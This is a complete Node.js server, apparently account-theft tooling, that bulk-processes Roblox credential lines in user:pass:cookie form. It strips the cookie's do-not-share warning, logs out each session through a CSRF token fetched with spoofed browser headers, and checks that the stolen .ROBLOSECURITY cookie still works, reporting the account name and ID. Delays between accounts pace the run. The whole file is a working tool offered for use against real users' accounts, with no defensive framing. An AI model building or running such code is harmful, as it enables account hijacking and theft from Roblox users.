// server.js — Roblox Session Killer
// deploy on Render: start command `node server.js`, port from process.env.PORT

const express = require('express');
const fetch = require('node-fetch');
const path = require('path');

const app = express();
app.use(express.json({ limit: '5mb' }));
app.use(express.static(path.join(__dirname, 'public')));

const CSRF_URL = 'https://auth.roblox.com/v2/logout';
const SIGNOUT_URL = 'https://auth.roblox.com/v2/logout'; // POST kills session, keeps cookie

function sleep(ms) {
  return new Promise(r => setTimeout(r, ms));
}

// Extract cookie value from a raw .ROBLOSECURITY cookie string
function normalizeCookie(raw) {
  let c = raw.trim();
  if (c.startsWith('.ROBLOSECURITY=')) c = c.slice('.ROBLOSECURITY='.length);
  // Roblox cookie often has warning prefix in exported form
  c = c.replace(/^_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_/, '');
  return c.trim();
}

async function killSession(cookieRaw) {
  const cookie = normalizeCookie(cookieRaw);
  if (!cookie || cookie.length < 100) {
    return { ok: false, error: 'cookie too short / malformed' };
  }

  const headers = {
    'Cookie': `.ROBLOSECURITY=${cookie}`,
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36',
    'Accept': 'application/json, text/plain, */*',
    'Origin': 'https://www.roblox.com',
    'Referer': 'https://www.roblox.com/',
  };

  // Step 1: fetch CSRF token by intentionally hitting logout without token
  let csrf = null;
  try {
    const r = await fetch(SIGNOUT_URL, { method: 'POST', headers });
    csrf = r.headers.get('x-csrf-token');
    // If no CSRF error, the signout may have already succeeded
    if (r.status === 200) {
      return { ok: true, note: 'signout returned 200, session killed, cookie preserved' };
    }
  } catch (e) {
    return { ok: false, error: 'csrf fetch failed: ' + e.message };
  }

  if (!csrf) {
    return { ok: false, error: 'no csrf token returned' };
  }

  // Step 2: POST signout WITH csrf — kills session, does NOT clear cookie
  try {
    const r2 = await fetch(SIGNOUT_URL, {
      method: 'POST',
      headers: { ...headers, 'X-CSRF-TOKEN': csrf },
    });
    if (r2.status === 200 || r2.status === 204) {
      return { ok: true, note: `signout ${r2.status}, session killed, cookie preserved` };
    }
    return { ok: false, error: `signout status ${r2.status}` };
  } catch (e) {
    return { ok: false, error: 'signout failed: ' + e.message };
  }
}

// Validate cookie still works after logout (proves cookie not dead)
async function validateCookie(cookieRaw) {
  const cookie = normalizeCookie(cookieRaw);
  try {
    const r = await fetch('https://users.roblox.com/v1/users/authenticated', {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'User-Agent': 'Mozilla/5.0',
      },
    });
    if (r.status === 200) {
      const j = await r.json();
      return { alive: true, user: j.name, id: j.id };
    }
    return { alive: false, status: r.status };
  } catch (e) {
    return { alive: false, error: e.message };
  }
}

app.post('/api/logout', async (req, res) => {
  const { accounts, delayMs } = req.body;
  if (!Array.isArray(accounts) || accounts.length === 0) {
    return res.status(400).json({ error: 'no accounts provided' });
  }

  const delay = Math.max(500, Math.min(parseInt(delayMs) || 3000, 60000));
  const results = [];

  for (let i = 0; i < accounts.length; i++) {
    const line = accounts[i];
    const parts = line.split(':');
    if (parts.length < 3) {
      results.push({ line: i + 1, ok: false, error: 'malformed (need user:pass:cookie)' });
      continue;
    }
    // cookie is everything after 2nd colon (passwords can contain colons, cookies can too)
    const user = parts[0];
    const cookie = parts.slice(2).join(':');

    const kill = await killSession(cookie);
    let validate = null;
    if (kill.ok) {
      validate = await validateCookie(cookie);
    }

    results.push({
      line: i + 1,
      user,
      kill,
      cookieAlive: validate ? validate.alive : false,
      robloxUser: validate?.user || null,
      robloxId: validate?.id || null,
    });

    if (i < accounts.length - 1) await sleep(delay);
  }

  res.json({ results, delayUsed: delay });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`rack warm on ${PORT}`));
